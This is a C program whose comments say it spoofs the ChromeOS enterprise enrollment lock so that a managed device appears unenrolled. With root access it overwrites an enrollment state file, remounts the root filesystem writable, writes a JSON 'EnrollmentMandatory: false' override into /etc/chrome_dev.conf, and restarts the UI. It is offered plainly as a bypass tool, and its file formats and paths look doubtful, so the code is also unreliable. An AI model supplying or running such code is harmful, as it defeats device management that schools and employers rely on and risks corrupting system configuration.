#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    // This C program attempts to spoof the enrollment lock flag.
    // It requires root privileges and access to system files.

    // Path to ChromeOS enrollment state file
    const char *enrollment_state = "/mnt/stateful_partition/.enrollment_state";

    // Open the state file for writing
    FILE *file = fopen(enrollment_state, "w");
    if (file == NULL) {
        perror("Failed to open enrollment state file");
        return 1;
    }

    // Write spoofed data to mimic an unenrolled state
    fprintf(file, "{\"enrollment_status\": \"unenrolled\", \"lock\": false}\n");
    fclose(file);

    // Modify ChromeOS policy enforcement
    system("mount -o remount,rw /");
    system("echo '{\"EnrollmentMandatory\": false}' > /etc/chrome_dev.conf");
    system("mount -o remount,ro /");

    // Restart the UI service to apply changes
    system("stop ui");
    sleep(2);
    system("start ui");

    printf("Enrollment lock spoofed. Device may appear unenrolled.\n");
    return 0;
}
